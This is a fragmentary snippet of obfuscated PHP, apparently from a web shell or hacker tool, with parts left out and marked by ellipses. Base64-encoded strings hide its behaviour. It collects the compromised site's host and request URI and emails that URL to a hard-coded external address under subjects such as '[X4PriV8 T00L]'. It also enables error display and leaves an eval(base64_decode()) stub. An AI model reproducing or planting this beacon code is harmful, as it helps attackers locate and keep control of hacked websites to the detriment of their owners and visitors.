...
$fortest = $_GET[base64_decode('ZW1haWw=')];
  ...
  if(mail("$ae7927c74",base64_decode('W0FST04tVE5d'),"http://$n466f2ffc")) {
   echo '';
} else {
   echo '';
}   
...
ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), true);
error_reporting(1);
    $ae7927c74 = base64_decode(base64_decode('YlhJdWNucHNkRUJuYldGcGJDNWpiMjA9=='));
  $d15c93851 = $_SERVER[base64_decode(base64_decode('U0ZSVVVGOUlUMU5V'))];
  $pee5ee7d2 = $_SERVER[base64_decode(base64_decode('VWtWUlZVVlRWRjlWVWtrPQ=='))];
  $n466f2ffc = rawurldecode($d15c93851.$pee5ee7d2);
  if(mail("$ae7927c74",base64_decode('W1g0UHJpVjggVDAwTF0='),"http://$n466f2ffc")) {
   echo '';
} else {
   echo '';
}  
...
eval (base64_decode(""));
